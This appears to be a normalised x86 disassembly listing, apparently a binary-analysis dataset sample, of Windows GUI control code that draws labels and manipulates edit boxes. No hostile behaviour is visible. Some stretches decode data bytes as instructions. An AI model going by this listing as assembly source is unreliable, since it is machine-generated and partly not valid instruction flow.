add [ ebx + ecx * 4 + 0x44 ] al
add ah bl
xor [ ebp ] eax
pushfd
mov eax [ eax + eax - 0x74 ]
xor eax 0x35900045
inc ebp
add [ eax + 0x34 ] cl
inc ebp
add al dh
xor eax [ ebp ]
push 0x38004560
inc ebp
add [ edx + esi * 2 + 0x45 ] bl
add ah ah
pop esp
inc ebp
add ah dl
pop edi
inc ebp
add [ ecx + ecx * 4 - 0x7547ffbc ] dh
inc esp
add [ eax + eax ] al
adc [ eax - 0x42ee4ffa ] dh
0xc8ff
sub_444144
add [ eax ] al
dec ah
test [ eax + eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] al
pop es
inc ebx
push 0x656b6365
mov ah 0x29
inc edx
add [ eax ] dh
add bh bh
hlt
sub_444f24
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_457d1c
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0xb9
mov eax esi
call sub_44f010
mov edx 0x69
mov eax esi
call sub_44f034
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax esi
pop esi
pop ebx
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_444f80
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4520c0
mov edx [ ebx + 0x68 ]
mov eax [ ebx + 0x208 ]
call sub_425568
mov edx r-xdata
mov eax [ ebx + 0x208 ]
call sub_4254c4
add [ esi + 0x4 ] eax
push 0xffffffff
push 0xffffffff
push esi
call InflateRect
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
pop esi
pop ebx
retn
push 0xffffffff
push 0xffffffff
push esi
call InflateRect
sub_444fec
push ebp
mov ebp esp
mov ecx 0x11
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_44538e
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebx + 0x208 ]
mov edx [ ebx + 0x68 ]
mov eax edi
call sub_425568
call sub_440198
call sub_440278
test al al
je r-xdata
mov edx r-xdata
mov eax edi
call sub_4254c4
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x4c ]
push eax
lea eax [ ebp - 0x1d ]
push eax
mov edx [ ebp - 0x4 ]
sar edx 0x1
jns r-xdata
lea edx [ ebp - 0x50 ]
mov eax ebx
call sub_44f854
cmp [ ebp - 0x50 ] 0x0
je r-xdata
dec edx
mov ecx [ ebx + 0x48 ]
xor eax eax
call sub_417358
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
adc edx 0x0
push 0x0
lea eax [ ebp - 0x2d ]
push eax
xor ecx ecx
xor edx edx
xor eax eax
call sub_417358
lea eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x54 ]
mov eax ebx
call sub_44f854
mov eax [ ebp - 0x54 ]
call sub_40436c
push eax
lea edx [ ebp - 0x58 ]
mov eax ebx
call sub_44f854
mov eax [ ebp - 0x58 ]
call sub_40456c
push eax
mov eax edi
call sub_425648
push eax
call GetTextExtentPoint32A
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x2d ]
push eax
mov ecx [ ebp - 0xc ]
xor edx edx
xor eax eax
call sub_417358
mov eax ebx
mov si 0xffc8
call sub_4034ac
test al al
jne r-xdata
mov edx 0xff000006
mov eax [ edi + 0x14 ]
call sub_424bc0
inc [ ebp - 0x1d ]
inc [ ebp - 0x19 ]
mov edx 0xff000014
mov eax [ edi + 0x14 ]
call sub_424bc0
lea edx [ ebp - 0x1d ]
mov eax edi
call sub_425260
push 0xffffffff
push 0xffffffff
lea eax [ ebp - 0x1d ]
push eax
call OffsetRect
mov edx 0xff000010
mov eax [ edi + 0x14 ]
call sub_424bc0
jmp r-xdata
mov [ ebp - 0x39 ] eax
mov eax [ ebp - 0x21 ]
push eax
mov eax [ ebp - 0x25 ]
push eax
mov eax [ ebp - 0x29 ]
push eax
mov eax [ ebp - 0x2d ]
push eax
mov eax edi
call sub_425648
push eax
call ExcludeClipRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
adc eax 0x0
push 0x0
mov eax [ ebx + 0x48 ]
sub eax 0x8
sub eax [ ebp - 0x25 ]
push eax
lea eax [ ebp - 0x2d ]
push eax
call OffsetRect
jmp r-xdata
push 0x0
push 0x8
lea eax [ ebp - 0x2d ]
push eax
call OffsetRect
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445395
lea eax [ ebp - 0x8c ]
mov edx 0x5
call sub_4040d0
lea eax [ ebp - 0x68 ]
mov edx 0x2
call sub_4040d0
lea eax [ ebp - 0x60 ]
call sub_4047b8
lea eax [ ebp - 0x5c ]
mov edx 0x4
call sub_4040d0
retn
mov eax ebx
mov si 0xffc8
call sub_4034ac
test al al
jne r-xdata
lea edx [ ebp - 0x1d ]
mov eax edi
call sub_425260
lea edx [ ebp - 0x68 ]
mov eax ebx
call sub_44f854
cmp [ ebp - 0x68 ] 0x0
je r-xdata
mov [ ebp - 0xd ] 0x1c
mov [ ebp - 0xd ] 0x1b
jmp r-xdata
lea edx [ ebp - 0x3d ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x21 ]
sub eax [ ebp - 0x29 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x78 ]
push eax
lea edx [ ebp - 0x7c ]
mov eax ebx
call sub_44f854
mov edx [ ebp - 0x7c ]
mov eax [ ebx + 0x208 ]
call sub_4254a8
push eax
mov eax [ ebp - 0x15 ]
pop edx
sub eax edx
sub eax 0x8
xor ecx ecx
xor edx edx
call sub_417358
push edi
lea esi [ ebp - 0x78 ]
lea edi [ ebp - 0x1d ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x1d ]
push eax
xor ecx ecx
xor edx edx
mov eax 0x8
call sub_417358
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax ebx
call sub_44f854
mov edx [ ebp - 0x64 ]
lea eax [ ebp - 0x60 ]
call sub_404904
mov eax [ ebp - 0x60 ]
push eax
lea eax [ ebp - 0x2d ]
push eax
push 0x0
push 0x0
mov eax edi
call sub_425648
push eax
call sub_440198
lea ecx [ ebp - 0x4c ]
pop edx
call sub_4403e0
jmp r-xdata
call sub_440198
lea ecx [ ebp - 0x4c ]
mov dl [ ebp - 0xd ]
call sub_440444
lea eax [ ebp - 0x3d ]
push eax
push 0x0
mov eax edi
call sub_425648
push eax
call sub_440198
lea ecx [ ebp - 0x4c ]
pop edx
call sub_440334
push 0x0
mov eax edi
call sub_425648
push eax
call SelectClipRgn
lea edx [ ebp - 0x5c ]
mov eax ebx
call sub_44f854
cmp [ ebp - 0x5c ] 0x0
je r-xdata
mov edx 0x20
mov eax ebx
call sub_451b4c
mov esi eax
mov eax esi
or eax 0x400
push eax
lea eax [ ebp - 0x1d ]
push eax
lea edx [ ebp - 0x80 ]
mov eax ebx
call sub_44f854
mov eax [ ebp - 0x80 ]
call sub_40436c
push eax
lea edx [ ebp - 0x84 ]
mov eax ebx
call sub_44f854
mov eax [ ebp - 0x84 ]
call sub_40456c
push eax
mov eax edi
call sub_425648
push eax
call DrawTextA
mov edx [ ebx + 0x70 ]
mov eax [ edi + 0x14 ]
call sub_424bc0
push esi
lea eax [ ebp - 0x1d ]
push eax
lea edx [ ebp - 0x88 ]
mov eax ebx
call sub_44f854
mov eax [ ebp - 0x88 ]
call sub_40436c
push eax
lea edx [ ebp - 0x8c ]
mov eax ebx
call sub_44f854
mov eax [ ebp - 0x8c ]
call sub_40456c
push eax
mov eax edi
call sub_425648
push eax
call DrawTextA
sub_44539f
inc [ ecx ]
add [ eax ] al
add [ eax ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_44541a
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_44f854
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_4666f8
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_4554d8
mov eax ebx
mov si 0xffb8
call sub_4034ac
test al al
je r-xdata
mov eax ebx
call sub_4565b4
mov [ edi + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445421
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
sub_44546c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_45729c
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0x41
mov eax esi
call sub_44f010
mov edx 0x11
mov eax esi
call sub_44f034
mov [ esi + 0x16d ] 0x1
mov [ esi + 0x170 ] 0x1
call sub_440198
call sub_440278
test al al
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
mov eax esi
test bl bl
je r-xdata
sub_445518
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_44566e
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x90 ]
test esi 0x400
je r-xdata
cmp [ ebx + 0x170 ] 0x0
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_451b4c
mov esi eax
mov edx [ ebx + 0x68 ]
mov eax [ ebx + 0x160 ]
call sub_425568
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
or esi 0x800
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404374
cmp [ ebx + 0x170 ] 0x0
je r-xdata
push esi
push edi
mov eax [ ebp - 0x4 ]
call sub_40436c
push eax
mov eax [ ebp - 0x4 ]
call sub_40456c
push eax
mov eax [ ebx + 0x160 ]
call sub_425648
push eax
call DrawTextA
push 0x1
push 0x1
push edi
call OffsetRect
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_4243f4
push esi
push edi
mov eax [ ebp - 0x4 ]
call sub_40436c
push eax
mov eax [ ebp - 0x4 ]
call sub_40456c
push eax
mov eax [ ebx + 0x160 ]
call sub_425648
push eax
call DrawTextA
push 0xffffffff
push 0xffffffff
push edi
call OffsetRect
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0xc ]
mov edx 0xff000010
call sub_4243f4
push esi
push edi
mov eax [ ebp - 0x4 ]
call sub_40436c
push eax
mov eax [ ebp - 0x4 ]
call sub_40456c
push eax
mov eax [ ebx + 0x160 ]
call sub_425648
push eax
call DrawTextA
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x26
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445675
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1 ] 0x0
jne r-xdata
sub_44567f
inc [ ecx ]
add [ eax ] al
add [ eax ] ah
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
add esp 0xffffffd0
mov ebx eax
mov esi [ ebx + 0x160 ]
mov eax ebx
call sub_4458a8
test al al
jne r-xdata
mov dl 0x1
mov eax [ esi + 0x14 ]
call sub_424cdc
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
xor eax eax
mov al [ ebx + 0x16f ]
mov di [ eax * 2 + rw-data ]
or di 0x40
xor eax eax
mov al [ ebx + 0x16c ]
or di [ eax * 2 + rw-data ]
movzx edi di
cmp [ ebx + 0x16e ] 0x0
je r-xdata
mov edx [ ebx + 0x70 ]
mov eax [ esi + 0x14 ]
call sub_424bc0
xor edx edx
mov eax [ esi + 0x14 ]
call sub_424cdc
lea edx [ esp + 0x20 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ esp + 0x20 ]
mov eax esi
call sub_425224
mov edx esp
mov ecx edi
mov eax ebx
mov si 0xffc6
call sub_4034ac
add esp 0x30
pop edi
pop esi
pop ebx
retn
push edi
lea esi [ esp + 0x4 ]
lea edi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov ecx edi
or ecx 0x400
lea edx [ esp + 0x10 ]
mov eax ebx
mov si 0xffc6
call sub_4034ac
cmp [ ebx + 0x16e ] 0x2
jne r-xdata
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x1c ]
sar eax 0x1
jns r-xdata
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x1c ]
push eax
push 0x0
lea eax [ esp + 0x8 ]
push eax
call OffsetRect
jmp r-xdata
push eax
push 0x0
lea eax [ esp + 0x8 ]
push eax
call OffsetRect
adc eax 0x0
sub_4457a0
push ebx
push esi
push edi
add esp 0xffffffec
mov edi eax
test [ edi + 0x1c ] 0x2
jne r-xdata
add esp 0x14
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x16d ] 0x0
je r-xdata
lea edx [ esp + 0x1 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x44 ]
push 0x0
call GetDC
mov ebx eax
mov edx ebx
mov eax [ edi + 0x160 ]
call sub_4256c8
xor eax eax
mov al [ edi + 0x16f ]
mov cx [ eax * 2 + rw-data ]
or cx 0x440
movzx ecx cx
lea edx [ esp + 0x1 ]
mov eax edi
mov si 0xffc6
call sub_4034ac
xor edx edx
mov eax [ edi + 0x160 ]
call sub_4256c8
push ebx
push 0x0
call ReleaseDC
mov ebx [ edi + 0x40 ]
mov al [ edi + 0x16c ]
mov [ esp ] al
mov eax edi
mov si 0xffc8
call sub_4034ac
test al al
je r-xdata
cmp [ esp ] 0x1
jne r-xdata
mov eax esp
call sub_44c634
mov eax [ esp + 0x9 ]
push eax
mov eax [ esp + 0x11 ]
push eax
mov ecx [ edi + 0x44 ]
mov edx ebx
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ edi + 0x48 ]
sub eax [ esp + 0x9 ]
add ebx eax
sub_4458e4
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_4458a8
cmp bl al
je r-xdata
mov [ esi + 0x188 ] 0x1
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_445944
push esi
push edi
mov edi eax
cmp dl [ edi + 0x16f ]
je r-xdata
pop edi
pop esi
retn
mov [ edi + 0x16f ] dl
mov eax edi
mov si 0xffc7
call sub_4034ac
mov eax edi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_44596c
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_44ed24
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x168 ]
jne r-xdata
xor eax eax
mov [ edi + 0x168 ] eax
sub_4459d0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_445a5d
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x168 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445a64
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
cmp [ ebx + 0x170 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_44f854
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_4666f8
test al al
je r-xdata
mov ebx [ ebx + 0x168 ]
mov eax ebx
mov si 0xffb8
call sub_4034ac
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
mov [ edi + 0xc ] 0x1
sub_445ab4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_451d80
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
mov edx 0x79
mov eax esi
call sub_44f010
mov edx 0x19
mov eax esi
call sub_44f034
mov dl 0x1
mov eax esi
call sub_456288
xor edx edx
mov eax esi
call sub_44fa18
mov [ esi + 0x20c ] 0x1
mov [ esi + 0x20f ] 0x1
mov [ esi + 0x210 ] 0x1
mov [ esi + 0x211 ] 0x1
mov eax esi
call sub_4461c4
mov eax esi
test bl bl
je r-xdata
sub_445b5c
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0xc5
mov eax ebx
call sub_456054
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_445bdc
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x208 ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x208 ] esi
mov eax ebx
call sub_456358
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xc8 ]
sub_445c20
push ebx
push esi
mov esi eax
mov bl [ esi + 0x215 ]
mov eax esi
call sub_456358
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0xb8
mov eax esi
call sub_456054
push eax
call SendMessageA
test eax eax
setne bl
sub_445c58
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_456358
test al al
je r-xdata
mov [ esi + 0x215 ] bl
pop esi
pop ebx
retn
push 0x0
xor eax eax
mov al bl
push eax
push 0xb9
mov eax esi
call sub_456054
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_445c90
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_445d0d
push [ fs : eax ]
mov [ fs : eax ] esp
cmp dl [ ebx + 0x20d ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445d14
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
mov [ ebx + 0x20d ] dl
mov eax ebx
call sub_456358
test al al
je r-xdata
push 0x0
xor eax eax
mov al [ ebx + 0x20d ]
push eax
push 0xcc
mov eax ebx
call sub_456054
push eax
call SendMessageA
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_44f854
mov eax [ ebp - 0x4 ]
call sub_40456c
mov edx eax
mov eax ebx
call sub_44f830
sub_445d18
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x20e ]
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x20e ] bl
mov eax esi
call sub_456358
test al al
je r-xdata
push 0x0
xor eax eax
mov al bl
push eax
push 0xcf
mov eax esi
call sub_456054
push eax
call SendMessageA
sub_445d54
push ebx
push ecx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0xb0
mov eax ebx
call sub_456054
push eax
call SendMessageA
mov eax [ esp ]
pop edx
pop ebx
retn
sub_445d78
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push esi
push 0xb1
mov eax ebx
call sub_456054
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_445d98
push ebx
add esp 0xfffffff8
mov ebx eax
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push 0xb0
mov eax ebx
call sub_456054
push eax
call SendMessageA
mov eax [ esp + 0x4 ]
sub eax [ esp ]
pop ecx
pop edx
pop ebx
retn
sub_445dc8
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push 0xb0
mov eax ebx
call sub_456054
push eax
call SendMessageA
add esi [ esp ]
mov [ esp + 0x4 ] esi
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push 0xb1
mov eax ebx
call sub_456054
push eax
call SendMessageA
push 0x0
push 0x0
push 0xb7
mov eax ebx
call sub_456054
push eax
call SendMessageA
pop ecx
pop edx
pop esi
pop ebx
retn
sub_445e64
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd0 ]
mov esi eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov [ ebp - 0x8 ] eax
mov eax ebx
call sub_44f7c8
inc eax
call sub_408b08
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_445eee
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_408b1c
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_44f7d8
cmp edi [ ebp - 0x8 ]
jg r-xdata
mov edx [ ebp - 0xc ]
add edx esi
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_40896c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445ef5
mov eax [ ebp - 0xc ]
call sub_408b54
retn
dec edi
mov [ ebp - 0x8 ] edi
sub_445f00
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd0 ]
mov [ ebp - 0x8 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov esi eax
mov eax edi
mov ecx esi
xor edx edx
call sub_40419c
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax ebx
call sub_44f7c8
inc eax
call sub_408b08
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_445f8e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_408b1c
mov ecx eax
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_44f7d8
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
add eax edx
mov edx [ edi ]
mov ecx esi
call sub_4028e8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_408b54
retn
sub_445f9c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_452ee0
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_452e0c
mov eax [ esi + 0x4 ]
or eax 0xc0
xor edx edx
mov dl [ ebx + 0x20c ]
or eax [ edx * 4 + rw-data ]
cmp [ ebx + 0x20d ] 0x0
setne dl
and edx 0x7f
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x20e ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x213 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x211 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x212 ]
or eax [ edx * 4 + rw-data ]
mov [ esi + 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x20c ] 0x1
jne r-xdata
and [ esi + 0x4 ] 0xff7fffff
or [ esi + 0x8 ] 0x200
sub_446055
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
add esp 0xffffff74
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax ebx
call sub_4531dc
mov eax [ rw-data ]
cmp [ eax ] 0x2
je r-xdata
test [ edx + 0x5 ] 0x8
je r-xdata
mov esi edx
mov edi esp
mov ecx 0x23
[ edi ] [ esi ]
and [ esp + 0x4 ] 0xfffff7ff
mov edx esp
mov eax ebx
call sub_4531dc
mov eax [ ebx + 0x180 ]
test eax eax
je r-xdata
add esp 0x8c
pop edi
pop esi
pop ebx
retn
push 0x0
push 0x1
push 0xcf
push eax
call SendMessageA
jmp r-xdata
sub_4460c8
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x214 ] 0x1
xor eax eax
push ebp
push sub_446107
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_45300c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44610e
mov eax [ ebp - 0x4 ]
mov [ eax + 0x214 ] 0x0
retn
sub_44610e
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x208 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc8 ]
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x215 ]
mov eax [ ebp - 0x4 ]
call sub_445c58
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20d ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_446188
pop ecx
pop ebp
retn
push 0x0
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x20d ]
push eax
push 0xcc
mov eax [ ebp - 0x4 ]
call sub_456054
push eax
call SendMessageA
sub_446188
push ebx
mov ebx eax
cmp [ ebx + 0x20f ] 0x0
je r-xdata
mov eax [ r-xdata ]
not eax
and eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
pop ebx
retn
cmp [ ebx + 0x20c ] 0x1
jne r-xdata
mov eax [ r-xdata ]
or eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
mov eax ebx
call sub_4461c4
pop ebx
retn
sub_4461c4
push ebx
push esi
push edi
add esp 0xffffff90
mov esi eax
push 0x0
call GetDC
mov ebx eax
push esp
push ebx
call GetTextMetricsA
mov eax [ esi + 0x68 ]
call sub_424408
push eax
push ebx
call SelectObject
mov edi eax
lea eax [ esp + 0x38 ]
push eax
push ebx
call GetTextMetricsA
push edi
push ebx
call SelectObject
push ebx
push 0x0
call ReleaseDC
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov ebx [ esp ]
mov eax [ esp + 0x38 ]
cmp ebx eax
jle r-xdata
cmp [ esi + 0x1a5 ] 0x0
je r-xdata
push 0x6
call GetSystemMetrics
shl eax 0x2
test ebx ebx
jns r-xdata
mov ebx eax
mov ebx 0x6
mov ebx 0x8
jmp r-xdata
sar ebx 0x2
add eax ebx
mov ebx eax
add ebx 0x3
mov edx [ esp + 0x38 ]
add edx ebx
mov eax esi
call sub_44f034
add esp 0x70
pop edi
pop esi
pop ebx
retn
push 0x6
call GetSystemMetrics
imul ebx
mov ebx eax
jmp r-xdata
sub_446290
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ ebx ]
sub eax 0x7
jne r-xdata
mov edx ebx
mov eax esi
call sub_453bcc
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
mov eax [ ebx + 0x4 ]
push eax
call IsWindow
test eax eax
jne r-xdata
xor eax eax
mov [ ebx + 0x4 ] eax
sub_4462c8
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop esi
retn
push 0xfffffff0
mov eax esi
call sub_456054
push eax
call GetWindowLongA
test al 0x4
jne r-xdata
push 0x0
push 0x3
push 0xd3
mov eax esi
call sub_456054
push eax
call SendMessageA
sub_446308
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_45566c
pop esi
pop ebx
retn
cmp [ ebx + 0x20c ] 0x1
jne r-xdata
mov eax ebx
call sub_446188
mov eax ebx
call sub_4535f4
sub_44633c
push ebx
mov ebx eax
mov eax ebx
call sub_4555b0
test [ ebx + 0x51 ] 0x2
je r-xdata
pop ebx
retn
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax ebx
call sub_4461c4
test [ ebx + 0x1c ] 0x1
jne r-xdata
sub_446384
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x210 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_455408
pop esi
pop ebx
retn
test [ ebx + 0x54 ] 0x1
jne r-xdata
push 0xfffffff0
mov eax ebx
call sub_456054
push eax
call GetWindowLongA
test al 0x4
jne r-xdata
mov eax ebx
call sub_445e48
sub_4463c0
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_456358
test al al
je r-xdata
mov eax esi
mov si 0xffb3
call sub_4034ac
push 0xfffffff0
